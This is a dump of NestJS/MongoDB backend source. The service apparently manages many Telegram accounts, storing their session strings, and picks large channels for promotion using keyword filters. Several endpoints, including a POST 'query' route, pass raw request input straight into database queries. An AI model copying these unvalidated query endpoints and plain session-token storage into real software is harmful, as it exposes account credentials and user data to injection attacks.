to',\n    example: 'client123',\n  })\n  @IsString()\n  readonly clientId: string;\n\n  @ApiProperty({\n    description: 'Status of the buffer client',\n    example: 'active',\n    enum: ['active', 'inactive'],\n    default: 'active',\n    required: false,\n  })\n  @IsString()\n  readonly status?: 'active' | 'inactive';\n\n\n  @ApiProperty({\n    description: 'Status message for the promote client',\n    example: 'Account is functioning properly',\n    default: 'Account is functioning properly',\n    required: false\n  })\n  @IsOptional()\n  @IsString()\n  message?: string;\n\n  @ApiProperty({\n    description: 'Last used timestamp for the promote client',\n    example: '2023-06-22T10:30:00.000Z',\n    required: false\n  })\n  @IsOptional()\n  @IsDateString()\n  readonly lastUsed?: Date;\n}\n","// Export all DTOs\nexport * from './create-buffer-client.dto';\nexport * from './search-buffer-client.dto';\nexport * from './update-buffer-client.dto';\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform } from 'class-transformer';\nimport { IsOptional, IsNumber, IsString, IsBoolean } from 'class-validator';\n\nexport class SearchBufferClientDto {\n  @ApiPropertyOptional({ description: 'Mobile number to search for' })\n  @IsOptional()\n  @IsString()\n  mobile?: string;\n\n  @ApiPropertyOptional({ description: 'Client ID to search for' })\n  @IsOptional()\n  @IsString()\n  clientId?: string;\n\n  @ApiPropertyOptional({ description: 'Username to search for' })\n  @IsOptional()\n  @IsString()\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Name to search for' })\n  @IsOptional()\n  @IsString()\n  name?: string;\n\n  @ApiPropertyOptional({ description: 'Channel link to search for' })\n  @IsOptional()\n  @IsString()\n  channelLink?: string;\n\n  @ApiPropertyOptional({ description: 'Repl link to search for' })\n  @IsOptional()\n  @IsString()\n  repl?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by active status' })\n  @IsOptional()\n  @IsBoolean()\n  @Transform(({ value }) => value === 'true' || value === true)\n  isActive?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by tgId' })\n  @IsOptional()\n  @IsString()\n  tgId?: string;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateBufferClientDto } from './create-buffer-client.dto';\n\nexport class UpdateBufferClientDto extends PartialType(CreateBufferClientDto) {\n    inUse?: boolean;\n    lastUsed?: Date;\n    privacyUpdatedAt?: Date;\n    profilePicsUpdatedAt?: Date;\n    nameBioUpdatedAt?: Date;\n    profilePicsDeletedAt?: Date;\n    usernameUpdatedAt?: Date;\n    lastChecked?: Date;\n    lastUpdateAttempt?: Date;\n    failedUpdateAttempts?: number;\n    lastUpdateFailure?: Date;\n}\n","export * from './buffer-client.controller';\nexport * from './buffer-client.module';\nexport * from './buffer-client.service';\nexport * from './dto';\nexport * from './schemas';\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type BufferClientDocument = BufferClient & Document;\n@Schema({\n  collection: 'bufferClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class BufferClient {\n  @Prop({ required: true })\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n\n  @Prop({ required: true })\n  session: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n\n  @Prop({ required: true })\n  clientId: string;\n\n  @Prop({ required: false, default: 'Account is functioning properly' })\n  message: string;\n\n  @Prop({ required: false, type: Date, default: null })\n  lastUsed: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  lastChecked: Date;\n\n  @Prop({\n    required: true,\n    enum: ['active', 'inactive'],\n    default: 'active',\n    type: String,\n    description: 'Status of the buffer client',\n  })\n  status: 'active' | 'inactive';\n\n  @Prop({ required: false, type: Boolean, default: false })\n  inUse: boolean;\n\n  @Prop({ required: false, type: Date, default: null })\n  privacyUpdatedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  profilePicsUpdatedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  nameBioUpdatedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  profilePicsDeletedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  usernameUpdatedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  createdAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  updatedAt: Date;\n\n  @Prop({ required: false, type: Date, default: null })\n  lastUpdateAttempt: Date;\n\n  @Prop({ required: false, type: Number, default: 0 })\n  failedUpdateAttempts: number;\n\n  @Prop({ required: false, type: Date, default: null })\n  lastUpdateFailure: Date;\n}\n\nexport const BufferClientSchema = SchemaFactory.createForClass(BufferClient);\n// BufferClientSchema.index(\n//   { clientId: 1 }, // apply uniqueness based on clientId\n//   { \n//     unique: true, \n//     partialFilterExpression: { inUse: true } // only enforce when inUse = true\n//   }\n// );\n","// Export all schemas\nexport * from './buffer-client.schema';\n","import { Controller, Get, Body, Patch, UseInterceptors } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { BuildService } from './build.service';\nimport { CloudflareCacheInterceptor } from '../../interceptors';\nimport { NoCache } from '../../decorators';\n\n@ApiTags('Build')\n@Controller('builds')\nexport class BuildController {\n  constructor(private readonly buildService: BuildService) { }\n\n  @Get()\n  @UseInterceptors(CloudflareCacheInterceptor)\n  @NoCache()\n  @ApiOperation({ summary: 'Get build data' })\n  async findOne(): Promise<any> {\n    return this.buildService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update build' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateClientDto: any): Promise<any> {\n    return this.buildService.update(updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BuildService } from './build.service';\nimport { BuildController } from './build.controller';\nimport { BuildSchema } from './builds.schema';\nimport { NpointModule } from '../n-point/npoint.module';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Global()\n@Module({\n  imports: [\n    InitModule,\n    BuildModule,\n    MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: BuildSchema }]),\n    NpointModule,\n  ],\n  providers: [BuildService],\n  controllers: [BuildController],\n  exports: [BuildModule],\n})\nexport class BuildModule { }","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Build } from './builds.schema';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class BuildService {\n    constructor(@InjectModel('buildModule') private buildModel: Model<Build>,\n        private npointSerive: NpointService) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.buildModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.buildModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        try {\n            await this.npointSerive.updateDocument(\"3375d15db1eece560188\", updatedUser)\n            console.log(\"Updated document successfully in npoint\")\n        } catch (error) {\n            console.log(error)\n        }\n        if (!updatedUser) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type BuildDocument = Build & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class Build {}\n\nexport const BuildSchema = SchemaFactory.createForClass(Build);\nBuildSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","export * from './build.controller';\nexport * from './build.module';\nexport * from './build.service';\nexport * from './builds.schema';\n","import { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ChannelsService } from './channels.service';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { SearchChannelDto } from './dto/search-channel.dto';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel } from './schemas/channel.schema';\n\n@ApiTags('Channels')\n@Controller('channels')\nexport class ChannelsController {\n  constructor(private readonly channelsService: ChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new  channel' })\n  async create(@Body() createChannelDto: CreateChannelDto) {\n    return this.channelsService.create(createChannelDto);\n  }\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateChannelDto[]): Promise<string> {\n    return this.channelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  search(@Query() query: SearchChannelDto): Promise<Channel[]> {\n    console.log(query);\n    return this.channelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all  channels' })\n  async findAll() {\n    return this.channelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the  channel', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.channelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateChannelDto: UpdateChannelDto) {\n    return this.channelsService.update(channelId, updateChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.channelsService.remove(channelId);\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ChannelsService } from './channels.service';\nimport { ChannelsController } from './channels.controller';\nimport { Channel, ChannelSchema } from './schemas/channel.schema';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: Channel.name, schema: ChannelSchema }]),\n  ],\n  controllers: [ChannelsController],\n  providers: [ChannelsService],\n  exports: [ChannelsService]\n})\nexport class ChannelsModule { }\n","import { BadRequestException, Injectable, InternalServerErrorException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel, ChannelDocument } from './schemas/channel.schema';\nimport { PipelineStage } from 'mongoose';\nimport { ChannelCategory } from '../bots';\nimport { getBotsServiceInstance } from '../../utils';\n\n@Injectable()\nexport class ChannelsService {\n  constructor(\n    @InjectModel(Channel.name) private ChannelModel: Model<ChannelDocument>,\n  ) {\n  }\n\n  async create(createChannelDto: CreateChannelDto): Promise<Channel> {\n    const createdChannel = new this.ChannelModel(createChannelDto);\n    return createdChannel.save();\n  }\n\n\n  async createMultiple(createChannelDtos: Partial<CreateChannelDto>[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => {\n      const setFields: Record<string, unknown> = {};\n      if (dto.title != null) setFields.title = dto.title;\n      if (dto.username != null) setFields.username = dto.username;\n      if (dto.participantsCount != null) setFields.participantsCount = dto.participantsCount;\n\n      return {\n        updateOne: {\n          filter: { channelId: dto.channelId },\n          update: {\n            $set: setFields,\n            $setOnInsert: {\n              channelId: dto.channelId,\n              broadcast: false,\n              canSendMsgs: true,\n              participantsCount: dto.participantsCount ?? 0,\n              restricted: false,\n              sendMessages: true,\n              reactRestricted: false,\n              wordRestriction: 0,\n              dMRestriction: 0,\n              availableMsgs: [],\n              banned: false,\n              megagroup: dto.megagroup !== undefined ? dto.megagroup : true,\n              private: false,\n            }\n          },\n          upsert: true\n        }\n      };\n    });\n\n    await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n  async findAll(): Promise<Channel[]> {\n    return this.ChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<Channel> {\n    const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateChannelDto: UpdateChannelDto): Promise<Channel> {\n    const updatedChannel = await this.ChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const botsService = getBotsServiceInstance();\n    if (botsService) {\n      botsService.sendMessageByCategory(ChannelCategory.PROM_LOGS2, `Removing Channel: ${channelId}`);\n    }\n    const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<Channel[]> {\n    console.log(filter)\n    return this.ChannelModel.find(filter).exec();\n  }\n\n  async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {\n    const pattern = new RegExp(keywords.join('|'), 'i');\n    const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\n    const query = {\n      $and: [\n        { username: { $ne: null } },\n        {\n          $or: [\n            { title: { $regex: pattern } },\n            { username: { $regex: pattern } }\n          ]\n        },\n        {\n          username: {\n            $not: {\n              $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\n            }\n          }\n        },\n        {\n          title: { $not: { $regex: notPattern } }\n        },\n        {\n          username: { $not: { $regex: notPattern } }\n        },\n        {\n          sendMessages: false,\n          broadcast: false,\n          restricted: false\n        }\n      ]\n    };\n\n    const sort: { participantsCount: \"desc\" } = { participantsCount: \"desc\" };\n    try {\n      const result: Channel[] = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number): Promise<Channel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.ChannelModel.find(query);\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          // {\n          //   '$or':\n          //     [\n          //       { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n          //       { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n          //     ]\n          // },\n          {\n            '$and': [\n              {\n                title: {\n                  $exists: true,\n                  $type: \"string\",\n                  '$not': { '$regex': /online|realestat|propert|freefire|bgmi|promo|agent|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }\n                }\n              },\n              {\n                username:\n                {\n                  $exists: true,\n                  $type: \"string\",\n                  '$not': { '$regex': /online|freefire|bgmi|promo|agent|realestat|propert|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }\n                }\n              },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 1000 },\n            username: { $ne: null },\n            canSendMsgs: true,\n            // banned: false,\n            restricted: false,\n            // forbidden: false\n          }\n        ]\n    }\n\n    try {\n\n      const pipeline: PipelineStage[] = [\n        { $match: query },\n        { $addFields: { randomField: { $rand: {} } } },\n        { $sort: { randomField: 1 as const } },\n        { $skip: skip },\n        { $limit: limit },\n        { $project: { randomField: 0 } }\n      ];\n      const result: Channel[] = await this.ChannelModel.aggregate<Channel>(pipeline, { allowDiskUse: true }).exec();\n      return result;\n    } catch (error) {\n      console.error(' Aggregation Error:', error);\n      return [];\n    }\n\n  }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateChannelDto {\n  @ApiProperty({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is a broadcast channel',\n    example: null,\n    required: false,\n  })\n  broadcast?: boolean;\n\n  @ApiProperty({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel is a megagroup',\n    example: null,\n    required: false,\n  })\n  megagroup?: boolean;\n\n  @ApiProperty({\n    description: 'Number of participants in the channel',\n    example: 0,\n  })\n  participantsCount: number;\n\n  @ApiProperty({\n    description: 'Whether the channel is restricted',\n    example: null,\n    required: false,\n  })\n  restricted?: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel can send messages',\n    example: null,\n    required: false,\n  })\n  sendMessages?: boolean;\n\n  @ApiProperty({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title: string;\n\n  @ApiProperty({\n    description: 'Username of the channel',\n    example: null,\n    required: false,\n  })\n  username?: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n\n  @ApiProperty({\n    default: false, example: false,\n    required: false,\n  })\n  forbidden: boolean = false;\n}\n","// Export all DTOs\nexport * from './create-channel.dto';\nexport * from './search-channel.dto';\nexport * from './update-channel.dto';\n","import { ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class SearchChannelDto {\n  @ApiPropertyOptional({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title?: string;\n\n  @ApiPropertyOptional({\n    description: 'privacy of the channel',\n    example: false,\n  })\n  private?: string;\n\n  @ApiPropertyOptional({\n    description: 'Username of the channel',\n    example: 'ayesha_channel',\n  })\n  username?: string;\n\n  @ApiPropertyOptional({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs?: boolean;\n\n  @ApiPropertyOptional({\n    description: 'Minimum number of participants in the channel',\n    example: 10,\n  })\n  minParticipantsCount?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum number of participants in the channel',\n    example: 100,\n  })\n  maxParticipantsCount?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateChannelDto } from './create-channel.dto';\n\nexport class UpdateChannelDto extends PartialType(CreateChannelDto) {}\n","export * from './channels.controller';\nexport * from './channels.module';\nexport * from './channels.service';\nexport * from './dto';\nexport * from './schemas';\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\n\nexport type ChannelDocument = Channel & Document;\n@Schema({\n  collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Channel {\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @Prop({ required: true })\n  title: string;\n\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @Prop({ required: true, default: false })\n  private: boolean;\n\n  @Prop({ default: false, required: false })\n  forbidden: boolean\n}\n\nexport const ChannelSchema = SchemaFactory.createForClass(Channel);\n","// Export all schemas\nexport * from './channel.schema';\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, HttpException, HttpStatus, UseInterceptors } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiQuery, ApiResponse } from '@nestjs/swagger';\r\nimport { ClientService } from './client.service';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { Client } from './schemas/client.schema';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\r\nimport { CloudflareCache } from '../../decorators';\r\nimport { CloudflareCacheInterceptor } from '../../interceptors';\r\n\r\n@ApiTags('Clients')\r\n@Controller('clients')\r\nexport class ClientController {\r\n  constructor(private readonly clientService: ClientService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  @ApiBody({ type: CreateClientDto })\r\n  @ApiResponse({ description: 'The user data has been successfully created.', type: Client })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    return await this.clientService.create(createClientDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  @ApiQuery({ name: 'clientId', required: false, description: 'Client ID' })\r\n  @ApiQuery({ name: 'dbcoll', required: false, description: 'Database collection name' })\r\n  @ApiQuery({ name: 'channelLink', required: false, description: 'Channel link' })\r\n  @ApiQuery({ name: 'link', required: false, description: 'Client link' })\r\n  @ApiResponse({ description: 'Matching user data returned successfully.', type: [Client] })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    return await this.clientService.search(query);\r\n  }\r\n\r\n  @Get('search/promote-mobile')\r\n  @ApiOperation({ summary: 'Search clients by promote mobile numbers' })\r\n  @ApiQuery({ name: 'mobile', required: true, description: 'Promote mobile number to search for' })\r\n  @ApiResponse({\r\n    description: 'Clients with matching promote mobiles returned successfully.',\r\n    type: Object,\r\n    schema: {\r\n      properties: {\r\n        clients: { type: 'array', items: { $ref: '#/components/schemas/Client' } },\r\n        matches: { type: 'array', items: { type: 'object', properties: { clientId: { type: 'string' }, mobile: { type: 'string' } } } },\r\n        searchedMobile: { type: 'string' },\r\n      },\r\n    },\r\n  })\r\n  async searchByPromoteMobile(@Query('mobile') mobile: string): Promise<{\r\n    clients: Client[];\r\n    matches: Array<{ clientId: string; mobile: string }>;\r\n    searchedMobile: string;\r\n  }> {\r\n    const result = await this.clientService.enhancedSearch({ promoteMobileNumber: mobile });\r\n    return {\r\n      clients: result.clients,\r\n      matches: result.promoteMobileMatches || [],\r\n      searchedMobile: mobile,\r\n    };\r\n  }\r\n\r\n  @Get('search/enhanced')\r\n  @ApiOperation({ summary: 'Enhanced search with promote mobile support' })\r\n  @ApiQuery({ name: 'promoteMobileNumber', required: false, description: 'Promote mobile number to search for' })\r\n  @ApiQuery({ name: 'hasPromoteMobiles', required: false, description: 'Filter by clients that have promote mobiles (true/false)' })\r\n  @ApiResponse({\r\n    description: 'Enhanced search results with promote mobile context.',\r\n    type: Object,\r\n    schema: {\r\n      properties: {\r\n        clients: { type: 'array', items: { $ref: '#/components/schemas/Client' } },\r\n        searchType: { type: 'string' },\r\n        promoteMobileMatches: { type: 'array', items: { type: 'object', properties: { clientId: { type: 'string' }, mobile: { type: 'string' } } } },\r\n        totalResults: { type: 'number' },\r\n      },\r\n    },\r\n  })\r\n  async enhancedSearch(@Query() query: any): Promise<{\r\n    clients: Client[];\r\n    searchType: string;\r\n    promoteMobileMatches?: Array<{ clientId: string; mobile: string }>;\r\n    totalResults: number;\r\n  }> {\r\n    const result = await this.clientService.enhancedSearch(query);\r\n    return {\r\n      clients: result.clients,\r\n      searchType: result.searchType,\r\n      promoteMobileMatches: result.promoteMobileMatches,\r\n      totalResults: result.clients.length,\r\n    };\r\n  }\r\n\r\n  @Get('updateClient/:clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n  @ApiResponse({ description: 'Return the user data.', type: String })\r\n  async updateClient(@Param('clientId') clientId: string) {\r\n    this.clientService.updateClient(clientId);\r\n    return 'Update client initiated';\r\n  }\r\n\r\n  @Get('maskedCls')\r\n  @UseInterceptors(CloudflareCacheInterceptor)\r\n  @CloudflareCache(3600, 60)\r\n  @ApiOperation({ summary: 'Get all user data with masked fields' })\r\n  @ApiResponse({ description: 'All user data returned successfully.', type: [Client] })\r\n  async findAllMasked() {\r\n    return await this.clientService.findAllMasked();\r\n  }\r\n\r\n  @Get('maskedCls/:clientId')\r\n  @UseInterceptors(CloudflareCacheInterceptor)\r\n  @CloudflareCache(3600, 60)\r\n  @ApiOperation({ summary: 'Get user data with masked fields by ID' })\r\n  @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n  @ApiResponse({ description: 'User data returned successfully.', type: Client })\r\n  async findOneMasked(@Param('clientId') clientId: string) {\r\n    return await this.clientService.findOneMasked(clientId);\r\n  }\r\n\r\n  @Get()\r\n  @UseInterceptors(CloudflareCacheInterceptor)\r\n  @CloudflareCache(3600, 60)\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  @ApiResponse({ description: 'All user data returned successfully.', type: [Client] })\r\n  async findAll() {\r\n    return await this.clientService.findAll();\r\n  }\r\n\r\n  @Get(':clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n  @ApiResponse({ description: 'User data returned successfully.', type: Client })\r\n  async findOne(@Param('clientId') clientId: string): Promise<Client> {\r\n    return await this.clientService.findOne(clientId);\r\n  }\r\n\r\n  @Patch(':clientId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n  @ApiBody({ type: UpdateClientDto })\r\n  @ApiResponse({ description: 'The user data has been successfully updated.', type: Client })\r\n  async update(@Param('clientId') clientId: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    return await this.clientService.update(clientId, updateClientDto);\r\n  }\r\n\r\n  @Delete(':clientId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  @ApiParam({ name: 'clientId', description: 'Client ID' })\r\n  @ApiResponse({ description: 'The user data has been successfully deleted.', type: Client })\r\n  async remove(@Param('clientId') clientId: string): Promise<Client> {\r\n    return await this.clientService.remove(clientId);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiBody({\r\n    schema: {\r\n      properties: {\r\n        query: { type: 'object' },\r\n        sort: { type: 'object' },\r\n        limit: { type: 'number' },\r\n        skip: { type: 'number' },\r\n      },\r\n    },\r\n  })\r\n  @ApiResponse({ description: 'Query executed successfully.' })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    return await this.clientService.executeQuery(query, sort, limit, skip);\r\n  }\r\n\r\n  @Patch(':clientId/promoteMobile/add')\r\n  @ApiOperation({ summary: 'Add a mobile number as a promote mobile for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({\r\n    schema: {\r\n      properties: {\r\n        mobileNumber: { type: 'string', example: '916265240911' },\r\n      },\r\n    },\r\n  })\r\n  @ApiResponse({ description: 'Mobile number assigned as promote mobile successfully.', type: Client })\r\n  async addPromoteMobile(@Param('clientId') clientId: string, @Body() body: { mobileNumber: string }): Promise<Client> {\r\n    return this.clientService.addPromoteMobile(clientId, body.mobileNumber);\r\n  }\r\n\r\n  @Patch(':clientId/promoteMobile/remove')\r\n  @ApiOperation({ summary: 'Remove a promote mobile assignment from a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({\r\n    schema: {\r\n      properties: {\r\n      